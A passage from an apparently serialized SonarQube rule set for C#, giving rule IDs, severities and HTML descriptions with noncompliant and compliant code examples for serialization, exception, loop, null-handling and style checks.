  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    public void OnSerializing(StreamingContext context) {} // Noncompliant should be private

    [OnSerialized]
    int OnSerialized(StreamingContext context) {} // Noncompliant should return void

    [OnDeserializing]
    void OnDeserializing() {} // Noncompliant should have a single parameter of type StreamingContext

    [OnSerializing]
    public void OnSerializing2&lt;T&gt;(StreamingContext context) {} // Noncompliant should have no type parameters

    [OnDeserialized]
    void OnDeserialized(StreamingContext context, string str) {} // Noncompliant should have a single parameter of type StreamingContext
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    private void OnSerializing(StreamingContext context) {}

    [OnSerialized]
    private void OnSerialized(StreamingContext context) {}

    [OnDeserializing]
    private void OnDeserializing(StreamingContext context) {}

    [OnDeserialized]
    private void OnDeserialized(StreamingContext context) {}
}
</pre>ZBUG
Ò
csharpsquid:S3925€
csharpsquidS3925/"ISerializable" should be implemented correctly"MAJOR*cs:¸<p>The <code>ISerializable</code> interface is the mechanism to control the type serialization process. If not implemented correctly this could result
in an invalid serialization and hard to detect bugs.</p>
<p>This rules raises an issue on types that implement <code>ISerializable</code> without following the serialization pattern recommended by
Microsoft.</p>
<p>Specifically this rule checks for these problems:</p>
<ul>
  <li> The <code>System.SerializableAttribute</code> attribute is missing. </li>
  <li> Non-serializable fields are not marked with the <code>System.NonSerializedAttribute</code> attribute. </li>
  <li> There is no serialization constructor. </li>
  <li> An unsealed type has a serialization constructor that is not <code>protected</code>. </li>
  <li> A sealed type has a serialization constructor that is not <code>private</code>. </li>
  <li> An unsealed type has a <code>ISerializable.GetObjectData</code> that is not both <code>public</code> and <code>virtual</code>. </li>
  <li> A derived type has a serialization constructor that does not call the <code>base</code> constructor. </li>
  <li> A derived type has a <code>ISerializable.GetObjectData</code> method that does not call the <code>base</code> method. </li>
  <li> A derived type has serializable fields but the <code>ISerializable.GetObjectData</code> method is not overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo : ISerializable // Noncompliant the [Serializable] attribute is missing
{
}
</pre>
<p>or</p>
<pre>
public class Bar
{
}

[Serializable]
public class Foo : ISerializable // Noncompliant the serialization constructor is missing
{
    private readonly Bar bar; // Noncompliant the field is not marked with [NonSerialized]
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Bar
{
}

[Serializable]
public class Foo : ISerializable
{
    [NonSerialized]
    private readonly Bar bar;

    public Foo()
    {
        // ...
    }

    protected Foo(SerializationInfo info, StreamingContext context)
    {
        // ...
    }

    public virtual void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        // ...
    }
}

[Serializable]
public sealed class SubFoo : Foo
{
    private int val;

    public SubFoo()
    {
        // ...
    }

    private SubFoo(SerializationInfo info, StreamingContext context)
        : base(info, context)
    {
        // ...
    }

    public override void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        base.GetObjectData(info, context);
        // ...
    }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Classes in test projects are not checked. </li>
</ul>Z
CODE_SMELL
Å
csharpsquid:S3928Î
csharpsquidS3928UParameter names used into ArgumentException constructors should match an existing one"MAJOR*cs:Ê<p>Some constructors of the <code>ArgumentException</code>, <code>ArgumentNullException</code>, <code>ArgumentOutOfRangeException</code> and
<code>DuplicateWaitObjectException</code> classes must be fed with a valid parameter name. This rule raises an issue in two cases:</p>
<ul>
  <li> When this parameter name doesn't match any existing ones. </li>
  <li> When a call is made to the default (parameterless) constructor </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void Foo(Bar a, int[] b)
{
  throw new ArgumentException(); // Noncompliant
  throw new ArgumentException("My error message", "c"); // Noncompliant
  throw new ArgumentException("My error message", "c", innerException); // Noncompliant
  throw new ArgumentNullException("c"); // Noncompliant
  throw new ArgumentNullException("My error message",‚ÄÇ"c"); // Noncompliant
  throw new ArgumentOutOfRangeException("c");
  throw new ArgumentOutOfRangeException("c", "My error message"); // Noncompliant
  throw new ArgumentOutOfRangeException("c",‚ÄÇb,‚ÄÇ"My error message"); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Foo(Bar a, Bar b)
{
  throw new ArgumentException("My error message", "a");
  throw new ArgumentException("My error message", "b", innerException);
  throw new ArgumentNullException("a");
  throw new ArgumentNullException(nameOf(a));
  throw new ArgumentNullException("My error message",‚ÄÇ"a");
  throw new ArgumentOutOfRangeException("b");
  throw new ArgumentOutOfRangeException("b", "My error message");
  throw new ArgumentOutOfRangeException("b",‚ÄÇb,‚ÄÇ"My error message");
}
</pre>
<h2>Exceptions</h2>
<p>The rule won't raise an issue if the parameter name is not a constant value (inline declaration, nameof() or const variable).</p>Z
CODE_SMELL


csharpsquid:S3926⁄

csharpsquidS3926FDeserialization methods should be provided for "OptionalField" members"MAJOR*cs:Î	<p>Fields marked with <code>System.Runtime.Serialization.OptionalFieldAttribute</code> are serialized just like any other field. But such fields are
ignored on deserialization, and retain the default values associated with their types. Therefore, deserialization event handlers should be declared to
set such fields during the deserialization process.</p>
<p>This rule raises when at least one field with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute is declared but one
(or both) of the following event handlers <code>System.Runtime.Serialization.OnDeserializingAttribute</code> or
<code>System.Runtime.Serialization.OnDeserializedAttribute</code> are not present.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[Serializable]
public class Foo
{
    [OptionalField(VersionAdded = 2)]
    int optionalField = 5;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Serializable]
public class Foo
{
    [OptionalField(VersionAdded = 2)]
    int optionalField = 5;

    [OnDeserializing]
    void OnDeserializing(StreamingContext context)
    {
	    optionalField = 5;
    }

    [OnDeserialized]
    void OnDeserialized(StreamingContext context)
    {
        // Set optionalField if dependent on other deserialized values.
    }
}
</pre>ZBUG
É	
csharpsquid:S3923Ì
csharpsquidS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*cs:Ì<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0)  // Noncompliant
{
    DoTheThing();
}
else
{
    DoTheThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) // Noncompliant
{
    case 1:
        DoSomething();
        break;
    case 2:
        DoSomething();
        break;
    case 3:
        DoSomething();
        break;
    default:
        DoSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if (b == 0)    //no issue, this could have been done on purpose to make the code more readable
{
    DoSomething();
}
else if (b == 1)
{
    DoSomething();
}
</pre>ZBUG
Ø
csharpsquid:S3457ô
csharpsquidS34571Composite format strings should be used correctly"MAJOR*cs:∏<p>Because composite format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that lead to unexpected
behaviors or runtime errors. This rule statically validates the good behavior of composite formats when calling the methods of
<code>String.Format</code>, <code>StringBuilder.AppendFormat</code>, <code>Console.Write</code>, <code>Console.WriteLine</code>,
<code>TextWriter.Write</code>, <code>TextWriter.WriteLine</code>, <code>Debug.WriteLine(String,‚ÄÇObject[])</code>,
<code>Trace.TraceError(String,‚ÄÇObject[])</code>, <code>Trace.TraceInformation(String,‚ÄÇObject[])</code>,
<code>Trace.TraceWarning(String,‚ÄÇObject[])</code> and <code>TraceSource.TraceInformation(String,‚ÄÇObject[])</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
s = string.Format("{0}", arg0, arg1); // Noncompliant, arg1 is declared but not used.
s = string.Format("{0} {2}", arg0, arg1, arg2); // Noncompliant, the format item with index 1 is missing so arg1 will not be used.
s = string.Format("foo"); // Noncompliant, there is no need to use string.Format here.
</pre>
<h2>Compliant Solution</h2>
<pre>
s = string.Format("{0}", arg0);
s = string.Format("{0} {1}", arg0, arg2);
s = "foo";
</pre>
<h2>Exceptions</h2>
<ul>
  <li> No issue is raised if the format string is not a <code>const</code>. </li>
</ul>
<pre>
var pattern = "{0} {1} {2}";
var res = string.Format(pattern, 1, 2); // Compliant, not const string are not recognized
</pre>
<ul>
  <li> No issue is raised if the argument is not an inline creation array. </li>
</ul>
<pre>
var array = new int[] {};
var res = string.Format("{0} {1}", array); // Compliant we don't know the size of the array
</pre>
<ul>
  <li> This rule doesn't check whether the format specifier (defined after the <code>:</code>) is actually valid. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>Z
CODE_SMELL
å
csharpsquid:S2123ˆ
csharpsquidS2123*Values should not be uselessly incremented"MAJOR*cs:£<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int PickNumber()
{
  int i = 0;
  int j = 0;

  i = i++; // Noncompliant; i is still zero

  return j++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int PickNumber()
{
  int i = 0;
  int j = 0;

  i++;
  return ++j;
}
</pre>ZBUG
ü
csharpsquid:S3453â
csharpsquidS34533Classes should not have only "private" constructors"MAJOR*cs:≠<p>A class with only <code>private</code> constructors can't be instantiated, thus, it seems to be pointless code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass // Noncompliant
{
  private MyClass() { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  public MyClass() { ... }
}
</pre>
<h2>Exceptions</h2>
<p>Classes that themselves access their private constructors (singletons or smart enums) are ignored. Classes with only <code>static</code> members
are also ignored because they are covered by Rule S1118.</p>ZBUG
Ó
csharpsquid:S4428ÿ
csharpsquidS4428C"PartCreationPolicyAttribute" should be used with "ExportAttribute""MAJOR*cs:Ï<p>The <code>PartCreationPolicyAttribute</code> attribute, which is part of the Managed Extensibility Framework (MEF), is used to specify how the
exported object will be created. Therefore it doesn't make sense not to export this a class with this attribute using the <code>ExportAttribute</code>
attribute.</p>
<p>This rule raises an issue when a class is marked as shared with a <code>PartCreationPolicyAttribute</code> but lacks a
<code>ExportAttribute</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[PartCreationPolicy(CreationPolicy.Any)] // Noncompliant
public class FooBar : IFooBar
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Export(typeof(IFooBar))]
[PartCreationPolicy(CreationPolicy.Any)]
public class FooBar : IFooBar
{
}
</pre>ZBUG
†
csharpsquid:S1151ä
csharpsquidS1151<"switch case" clauses should not have too many lines of code"MAJOR*cs:û<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
switch (myVariable)
{
    case 0: // Noncompliant: 5 statements in the case
        methodCall1("");
        methodCall2("");
        methodCall3("");
        methodCall4("");
        break;
    case 1:
        ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable)
{
    case 0:
        DoSomething()
        break;
    case 1:
        ...
}
...
private void DoSomething()
{
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
}
</pre>Z
CODE_SMELL
∞
csharpsquid:S125õ
csharpsquidS125,Sections of code should not be commented out"MAJOR*cs:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
É
csharpsquid:S127Ó

csharpsquidS127."for" loop stop conditions should be invariant"MAJOR*cs:ë
<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
    static void Main()
    {
        for (int i = 1; i &lt;= 5; i++)
        {
            Console.WriteLine(i);
            if (condition)
            {
               i = 20;
           }
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo
{
    static void Main()
    {
        for (int i = 1; i &lt;= 5; i++)
        {
            Console.WriteLine(i);
        }
    }
}
</pre>Z
CODE_SMELL
ÿ
csharpsquid:S2259¬
csharpsquidS2259(Null pointers should not be dereferenced"MAJOR*cs:Ò<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullReferenceException</code> to be thrown. At
best, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or
it could allow an attacker to bypass security measures.</p>
<h2>Noncompliant Code Example</h2>
<pre>
object o = null;
if (condition)
{
  M1(o.ToString()); // Noncompliant, always null
}
else
{
  o = new object();
}
M2(o.ToString());
</pre>
<h2>Exceptions</h2>
<p>Calls to extension methods are not reported because they can still operate on <code>null</code> values.</p>
<p>To create a custom null validation method declare an attribute with name <code>ValidatedNotNullAttribute</code> and mark the parameter that is
validated for null in your method declaration with it:</p>
<pre>
using System;

public sealed class ValidatedNotNullAttribute : Attribute { }

public static class Guard
{
    public static void NotNull&lt;T&gt;([ValidatedNotNull] this T value, string name) where T : class
    {
        if (value == null)
            throw new ArgumentNullException(name);
    }
}

public static class Utils
{
    public static string ToUpper(string value)
    {
        Guard.NotNull(value, nameof(value));
        if (value == null)
        {
            return value.ToString(); // Compliant, this code is not reachable
        }
        return value.ToUpper();
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PAw">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
∞
csharpsquid:S1168ö
csharpsquidS1168?Empty arrays and collections should be returned instead of null"MAJOR*cs:´<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more
complex and less readable.</p>
<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Result[] GetResults()
{
    return null; // Noncompliant
}

public IEnumerable&lt;Result&gt; GetResults()
{
    return null; // Noncompliant
}

public IEnumerable&lt;Result&gt; GetResults() =&gt; null; // Noncompliant

public IEnumerable&lt;Result&gt; Results
{
    get
    {
        return null; // Noncompliant
    }
}

public IEnumerable&lt;Result&gt; Results =&gt; null; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public Result[] GetResults()
{
    return new Result[0];
}

public IEnumerable&lt;Result&gt; GetResults()
{
    return Enumerable.Empty&lt;Result&gt;();
}

public IEnumerable&lt;Result&gt; GetResults() =&gt; Enumerable.Empty&lt;Result&gt;();

public IEnumerable&lt;Result&gt; Results
{
    get
    {
        return Enumerable.Empty&lt;Result&gt;();
    }
}

public IEnumerable&lt;Result&gt; Results =&gt; Enumerable.Empty&lt;Result&gt;();
</pre>
<h2>Exceptions</h2>
<p>Although <code>string</code> is a collection, the rule won't report on it.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AgG7AQ">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an
  empty array over a null value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zwHEAw">CERT, MET55-J.</a> - Return an empty array or collection instead of a null
  value for methods that return an array or collection </li>
</ul>Z
CODE_SMELL
Ã
csharpsquid:S3346∂
csharpsquidS3346BExpressions used in "Debug.Assert" should not produce side effects"MAJOR*cs:À
<p>An assertion is a piece of code that's used during development when the compilation debug mode is activated. It allows a program to check itself as
it runs. When an assertion is true, that means everything is operating as expected. </p>
<p>In non-debug mode, all <code>Debug.Assert</code> are automatically left out. So, by contract, the boolean expressions that are evaluated by those
assertions must absolutely not contain any side effects. Otherwise, when leaving the Debug mode, the functional behavior of the application is not the
same anymore.</p>
<p>The rule will raise if the method name starts with any of the following <code>remove</code>, <code>delete</code>, <code>add</code>,
<code>pop</code>, <code>update</code>, <code>retain</code>, <code>insert</code>, <code>push</code>, <code>append</code>, <code>clear</code>,
<code>dequeue</code>, <code>enqueue</code>, <code>dispose</code>, <code>put</code>, or <code>set</code>, although <code>SetEquals</code> will be
ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Debug.Assert(list.Remove("dog"));
</pre>
<h2>Compliant Solution</h2>
<pre>
bool result = list.Remove("dog");
Debug.Assert(result);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/vwG7AQ">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side
  effects </li>
</ul>ZBUG
å
csharpsquid:S3466ˆ

csharpsquidS34664Optional parameters should be passed to "base" calls"MAJOR*cs:ô
<p>Generally, writing the least code that will <em>readably</em> do the job is a good thing, so omitting default parameter values seems to make sense.
Unfortunately, when you omit them from the <code>base</code> call in an override, you're not actually getting the job done thoroughly, because you're
ignoring the value the caller passed in. The result will likely not be what the caller expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class BaseClass
{
    public virtual void MyMethod(int i = 1)
    {
        Console.WriteLine(i);
    }
}

public class DerivedClass : BaseClass
{
    public override void MyMethod(int i = 1)
    {
        // ...
        base.MyMethod(); // Noncompliant; caller's value is ignored
    }

    static int Main(string[] args)
    {
        DerivedClass dc = new DerivedClass();
        dc.MyMethod(12);  // prints 1
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class BaseClass
{
    public virtual void MyMethod(int i = 1)
    {
        Console.WriteLine(i);
    }
}

public class DerivedClass : BaseClass
{
    public override void MyMethod(int i = 1)
    {
        // ...
        base.MyMethod(i);
    }

    static int Main(string[] args)
    {
        DerivedClass dc = new DerivedClass();
        dc.MyMethod(12);  // prints 12
    }
}
</pre>ZBUG
ı
csharpsquid:S3343ﬂ
csharpsquidS3343JCaller information parameters should come at the end of the parameter list"MAJOR*cs:Ï<p>Caller information attributes (<code>CallerFilePathAttribute</code>, <code>CallerLineNumberAttribute</code>, and
<code>CallerMemberNameAttribute</code>) provide a way to get information about the caller of a method through optional parameters. But they only work
right if their values aren't provided explicitly. So if you define a method with caller info attributes in the middle of the parameter list, you put
your callers in a bad position: they are forced to use named arguments if they want to use the method properly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void TraceMessage([CallerMemberName] string memberName = "",
  [CallerFilePath] string filePath = "",
  [CallerLineNumber] int lineNumber = 0,
  string message = null)  // Noncompliant
{
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void TraceMessage(string message = null,
  [CallerMemberName] string memberName = "",
  [CallerFilePath] string filePath = "",
  [CallerLineNumber] int lineNumber = 0)
{
  /* ... */
}
</pre>ZBUG
ﬂ
csharpsquid:S2376…
csharpsquidS2376(Write-only properties should not be used"MAJOR*cs:Ò<p>Properties with only setters are confusing and counterintuitive. Instead, a property getter should be added if possible, or the property should be
replaced with a setter method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Program
{
    public int Foo  //Non-Compliant
    {
        set
        {
            // ... some code ...
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Program
{
    private int foo;

    public void SetFoo(int value)
    {
        // ... some code ...
        foo = value;
    }
}
</pre>
<p>or</p>
<pre>
class Program
{
  public int Foo { get; set; } // Compliant
}
</pre>Z
CODE_SMELL
õ
csharpsquid:S2252Ö
csharpsquidS22520For-loop conditions should be true at least once"MAJOR*cs:¨<p>If a <code>for</code> loop's condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always
bugs, particularly when the initial value and stop conditions are hard-coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 10; i &lt; 10; i++)  // Noncompliant
{
    // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    // ...
}
</pre>ZBUG
”	
csharpsquid:S1607Ω	
csharpsquidS1607Tests should not be ignored"MAJOR*cs:Ú<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why
the test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up
polluting their projects.</p>
<p>This rule raises an issue for each ignored test that does not have a <code>WorkItem</code> attribute nor a comment about why it is being skipped on
the right side of the <code>Ignore</code> attribute.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
[Ignore]  // Noncompliant
public void Test_DoTheThing()
{
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
[Ignore]  // renable when TCKT-1234 is fixed
public void Test_DoTheThing()
{
  // ...
}
</pre>
<p>or</p>
<pre>
[TestMethod]
[Ignore]
[WorkItem(1234)]
public void Test_DoTheThing()
{
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't raise an issue if:</p>
<p>- the test method is also marked with <code>WorkItem</code> attribute</p>
<p>- there is a comment on the right side of the <code>Ignore</code> attribute</p>Z
CODE_SMELL
◊
csharpsquid:S1848¡
csharpsquidS1848JObjects should not be created to be dropped immediately without being used"MAJOR*cs:Œ<p>There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could
lead to an unexpected behavior in production.</p>
<p>If it was done on purpose because the constructor has side-effects, then that side-effect code should be moved into a separate, static method and
called directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new ArgumentException("x must be nonnegative");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new ArgumentException("x must be nonnegative");
</pre>ZBUG
∂
csharpsquid:S3906†
csharpsquidS39060Event Handlers should have the correct signature"MAJOR*cs:¿<p>Delegate event handlers (i.e. delegates used as type of an event) should have a very specific signature:</p>
<ul>
  <li> Return type <code>void</code>. </li>
  <li> First argument of type <code>System.Object</code> and named 'sender'. </li>
  <li> Second argument of type <code>System.EventArgs</code> (or any derived type) and is named 'e'. </li>
</ul>
<p>This rule raises an issue whenever a <code>delegate</code> declaration doesn't match that signature.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public delegate void AlarmEventHandler(object s);

public class Foo
{
    public event AlarmEventHandler AlarmEvent; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public delegate void AlarmEventHandler(object sender, AlarmEventArgs e);

public class Foo
{
    public event AlarmEventHandler AlarmEvent; // Compliant
}
</pre>
<h2>See</h2>
<p><a href="https://msdn.microsoft.com/en-us/library/edzehd2t.aspx">Handling and Raising Events</a></p>Z
CODE_SMELL
ﬂ
csharpsquid:S3903…
csharpsquidS3903+Types should be defined in named namespaces"MAJOR*cs:ı<p>Types are declared in namespaces in order to prevent name collisions and as a way to organize them into the object hierarchy. Types that are
defined outside any named namespace are in a global namespace that cannot be referenced in code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo // Noncompliant
{
}

public struct Bar // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace SomeSpace
{
    public class Foo
    {
    }

    public struct Bar
    {
    }
}
</pre>ZBUG
·	
csharpsquid:S2933À	
csharpsquidS2933EFields that are only assigned in the constructor should be "readonly""MAJOR*cs:÷<p><code>readonly</code> fields can only be assigned in a class constructor. If a class has a field that's not marked <code>readonly</code> but is
only set in the constructor, it could cause confusion about the field's intended use. To avoid confusion, such fields should be marked
<code>readonly</code> to make their intended use explicit, and to prevent future maintainers from inadvertently changing their use.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
    private int _birthYear;  // Noncompliant

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person
{
    private readonly int _birthYear;

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Exceptions</h2>
<p> * Fields with attributes are ignored.</p>
<p> * Fields of type <code>struct</code> that are not primitive or pointer types are also ignored because of possible unwanted behavior.</p>
<h2>See</h2>
<p> * <a href="https://ericlippert.com/2008/05/14/mutating-readonly-structs/">Mutating readonly structs</a></p>Z
CODE_SMELL
˘

csharpsquid:S3902„

csharpsquidS39024"Assembly.GetExecutingAssembly" should not be called"MAJOR*cs:ˇ	<p>Using <code>Type.Assembly</code> to get the current assembly is nearly free in terms of performance; it's a simple property access. On the other
hand, <code>Assembly.GetExecutingAssembly()</code> can take up to 30 times as long because it walks up the call stack to find the assembly.</p>
<p>Note that <code>Assembly.GetExecutingAssembly()</code> is different than <code>Type.Assembly</code> because it dynamically returns the assembly
that contains the startup object of the currently executed application. For example, if executed from an application it will return the application
assembly, but if executed from a unit test project it could return the unit test assembly. <code>Type.Assembly</code> always returns the assembly that
contains the specified type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = Assembly.GetExecutingAssembly(); // Noncompliant
      Console.WriteLine("Assembly name: {0}", assem.FullName);
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = typeof(Example).Assembly; // Here we use the type of the current class
      Console.WriteLine("Assembly name: {0}", assem.FullName);
   }
}
</pre>Z
CODE_SMELL
∫
csharpsquid:S3900§
csharpsquidS3900<Arguments of public methods should be validated against null"MAJOR*cs:∏<p>A publicly accessible method can be called from anywhere, which means you should validate parameters to be within the expected constraints. In
general, checking against <code>null</code> is recommended defensive programming.</p>
<p>This rule raises an issue when a parameter of a publicly accessible method is not validated against <code>null</code> before being
dereferenced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other; // Compliant: other not being dereferenced
    }

    public void Bar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }

    protected void FooBar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other;
    }

    public void Bar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }

    protected void FooBar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>To create a custom null validation method declare an attribute with name <code>ValidatedNotNullAttribute</code> and mark the parameter that is
validated for null in your method declaration with it:</p>
<pre>
using System;

public sealed class ValidatedNotNullAttribute : Attribute { }

public static class Guard
{
    public static void NotNull&lt;T&gt;([ValidatedNotNullAttribute] this T value, string name) where T : class
    {
        if (value == null)
            throw new ArgumentNullException(name);
    }
}

public static class Utils
{
    public static string ToUpper(string value)
    {
        Guard.NotNull(value, nameof(value));
        if (value == null)
        {
            return value.ToString();
        }
        return value.ToUpper(); // Compliant
    }
}
</pre>Z
CODE_SMELL
„
csharpsquid:S2372Õ
csharpsquidS23725Exceptions should not be thrown from property getters"MAJOR*cs:Ë<p>Property getters should be simple operations that are always safe to call. If exceptions need to be thrown, it is best to convert the property to a
method. </p>
<p>It is valid to throw exceptions from indexed property getters and from property setters, which are not detected by this rule.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int Foo
{
    get
    {
        throw new Exception(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int Foo
{
    get
    {
        return 42;
    }
}
</pre>
<h2>Exceptions</h2>
<p>No issue is raised when the thrown exception derives from or is of type <code>NotImplementedException</code>, <code>NotSupportedException</code> or
<code>InvalidOperationException</code>.</p>Z
CODE_SMELL
á
csharpsquid:S2251Ò
csharpsquidS2251IA "for" loop update clause should move the counter in the right direction"MAJOR*cs:ˇ<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually
reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(string[] strings)
{
  for (int i = 0; i &lt; strings.Length; i--)  // Noncompliant
  {
    string s = strings[i];  // IndexOutOfRangeException  when i reaches -1
    // do stuff
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void DoSomething(string[] strings)
{
  for (int i = 0; i &lt; strings.Length; i++)
  {
    string s = strings[i];
    // do stuff
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zYEzAg">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>ZBUG
ê
csharpsquid:S138˚
csharpsquidS1380Functions should not have too many lines of code"MAJOR*cs:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
¨
csharpsquid:S2743ñ
csharpsquidS27431Static fields should not be used in generic types"MAJOR*cs:µ<p>A static field in a generic type is not shared among instances of different closed constructed types, thus
